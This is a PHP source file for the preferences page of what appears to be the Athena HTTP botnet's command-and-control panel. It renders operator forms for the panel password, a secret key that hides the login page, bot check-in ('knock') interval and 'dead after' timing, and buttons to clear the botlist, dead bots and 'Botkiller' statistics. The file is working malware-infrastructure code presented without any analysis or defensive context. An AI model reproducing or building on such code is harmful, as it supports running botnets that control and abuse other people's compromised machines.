<?php

	if(!defined('AthenaHTTP')) header('Location: ..');

	$PAGE_INCLUDE = '';
	
	require_once './include/inc_prefs.php';
	
	if($STATUS_NOTE)
	{
		$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
		$PAGE_INCLUDE .= '				<span class="title"> </span>' . "\n";
		$PAGE_INCLUDE .= '				<p>' . "\n";
		$PAGE_INCLUDE .= '					' . $STATUS_MESSAGE . "\n";
		$PAGE_INCLUDE .= '				</p>' . "\n";
		$PAGE_INCLUDE .= '			</div>' . "\n";
	}
		
	$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
	$PAGE_INCLUDE .= '				<span class="title">Change Password</span>' . "\n";
	$PAGE_INCLUDE .= '				<form action="./index.php?p=prefs" method="POST">' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Old Password:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input type="password" name="pref_oldpass" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">New Password:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input type="password" name="pref_newpass" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">New Password: (confirm)</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input type="password" name="pref_newpassconf" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<span class="foot">' . "\n";
	$PAGE_INCLUDE .= '						<input type="submit" value="Change Password" /> ' . "\n";
	$PAGE_INCLUDE .= '					</span>' . "\n";
	$PAGE_INCLUDE .= '				</form>' . "\n";
	$PAGE_INCLUDE .= '			</div>' . "\n";
	
	if($USERINFO['admin'])
	{	
		$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
		$PAGE_INCLUDE .= '				<span class="title">Login Page Key</span>' . "\n";
		$PAGE_INCLUDE .= '				<form action="./index.php?p=prefs" method="POST">' . "\n";
		$PAGE_INCLUDE .= '					<p>' . "\n";
		$PAGE_INCLUDE .= '						<span class="left">Key (/login/?key=123):</span>' . "\n";
		$PAGE_INCLUDE .= '						<span class="right"><input type="text" name="pref_loginpagekey" value="' . htmlentities($config_loginpagekey['key']) . '" /></span>' . "\n";
		$PAGE_INCLUDE .= '					</p>' . "\n";
		$PAGE_INCLUDE .= '					<span class="foot">' . "\n";
		$PAGE_INCLUDE .= '						<input type="submit" value="Apply" /> ' . "\n";
		
		if($config_loginpagekey_enabled['data'] == 0)
		{
			$PAGE_INCLUDE .= '						<input onClick="navigateTo(\'./index.php?p=prefs&c=enableloginpagekey\');" type="button" class="" value="Enable" />' . "\n";
		}
		else
		{
			$PAGE_INCLUDE .= '						<input onClick="navigateTo(\'./index.php?p=prefs&c=disableloginpagekey\');" type="button" class="" value="Disable" />' . "\n";
		}
		
		$PAGE_INCLUDE .= '					</span>' . "\n";
		$PAGE_INCLUDE .= '				</form>' . "\n";
		$PAGE_INCLUDE .= '			</div>' . "\n";
		
		$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
		$PAGE_INCLUDE .= '				<span class="title">Change Bot Settings</span>' . "\n";
		$PAGE_INCLUDE .= '				<form action="./index.php?p=prefs" method="POST">' . "\n";
		$PAGE_INCLUDE .= '					<p>' . "\n";
		$PAGE_INCLUDE .= '						<span class="left">Knock interval: (seconds)</span>' . "\n";
		$PAGE_INCLUDE .= '						<span class="right"><input type="text" name="pref_knock" value="' . htmlentities($config_online['data']) . '" /></span>' . "\n";
		$PAGE_INCLUDE .= '					</p>' . "\n";
		$PAGE_INCLUDE .= '					<p>' . "\n";
		$PAGE_INCLUDE .= '						<span class="left">Dead after: (days)</span>' . "\n";
		$PAGE_INCLUDE .= '						<span class="right"><input type="text" name="pref_dead" value="' . htmlentities($config_dead['data'] / 86400) . '" /></span>' . "\n";
		$PAGE_INCLUDE .= '					</p>' . "\n";
		$PAGE_INCLUDE .= '					<span class="foot">' . "\n";
		$PAGE_INCLUDE .= '						<input type="submit" value="Apply" /> ' . "\n";
		$PAGE_INCLUDE .= '					</span>' . "\n";
		$PAGE_INCLUDE .= '				</form>' . "\n";
		$PAGE_INCLUDE .= '			</div>' . "\n";
		
		$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
		$PAGE_INCLUDE .= '				<span class="title">Clear</span>' . "\n";
		$PAGE_INCLUDE .= '				<span class="foot">' . "\n";
		$PAGE_INCLUDE .= '					<input onClick="navigateTo(\'./index.php?p=prefs&c=kill\');" type="button" class="" value="Clear Botkiller Statistics" />' . "\n";
		$PAGE_INCLUDE .= '					<input onClick="navigateTo(\'./index.php?p=prefs&c=bots\');" type="button" class="" value="Clear Botlist" /><br />' . "\n";
		$PAGE_INCLUDE .= '					<input onClick="navigateTo(\'./index.php?p=prefs&c=offdead\');" type="button" class="" value="Clear Offline & Dead Bots" />' . "\n";
		$PAGE_INCLUDE .= '				</span>' . "\n";
		$PAGE_INCLUDE .= '			</div>' . "\n";
	}

?>